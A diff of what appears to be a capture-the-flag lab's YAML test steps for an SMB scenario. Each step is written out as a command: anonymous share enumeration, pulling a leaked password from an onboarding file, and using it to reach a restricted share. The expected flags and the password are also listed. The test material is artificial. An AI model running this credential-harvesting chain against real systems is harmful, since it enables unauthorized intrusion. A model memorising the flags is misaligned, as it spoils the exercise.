@@ -75,26 +75,26 @@ topology:
 test:
   steps:
     - name: "SMB port is accessible"
-      command: "nmap -p 445 --open {target.target} 2>/dev/null | grep -c '445.*open'"
+      command: "nmap -p 445 --open {target.target} 2>&1 | grep -c '445.*open'"
       expect: "1"
       timeout: 15
 
     - name: "Enumerate shares with anonymous access"
-      command: "smbclient -L //{target.target} -N 2>/dev/null | grep -c Disk"
+      command: "smbclient -L //{target.target} -N 2>&1 | grep -c Disk"
       timeout: 15
 
     - name: "Access public share and extract token 1"
-      command: "smbclient //{target.target}/general -N -c 'get token.txt /tmp/smb_token1.txt' 2>/dev/null && cat /tmp/smb_token1.txt"
+      command: "smbclient //{target.target}/general -N -c 'get token.txt /tmp/smb_token1.txt' 2>&1 && cat /tmp/smb_token1.txt"
       expect: "3num"
       timeout: 15
 
     - name: "Find leaked credentials in public share"
-      command: "smbclient //{target.target}/general -N -c 'get onboarding_notes.txt /tmp/smb_notes.txt' 2>/dev/null && grep -o 'Password: [^ ]*' /tmp/smb_notes.txt | awk '{print $2}'"
+      command: "smbclient //{target.target}/general -N -c 'get onboarding_notes.txt /tmp/smb_notes.txt' 2>&1 && grep -o 'Password: [^ ]*' /tmp/smb_notes.txt | awk '{print $2}'"
       expect: "Bl4ckw3ll_HR#"
       timeout: 15
 
     - name: "Access restricted share with discovered credentials"
-      command: "smbclient //{target.target}/hr_data -U hr_svc%Bl4ckw3ll_HR# -c 'get assessment_token.txt /tmp/smb_token2.txt' 2>/dev/null && cat /tmp/smb_token2.txt"
+      command: "smbclient //{target.target}/hr_data -U hr_svc%Bl4ckw3ll_HR# -c 'get assessment_token.txt /tmp/smb_token2.txt' 2>&1 && cat /tmp/smb_token2.txt"
       expect: "sh4r3d"
       timeout: 15
 
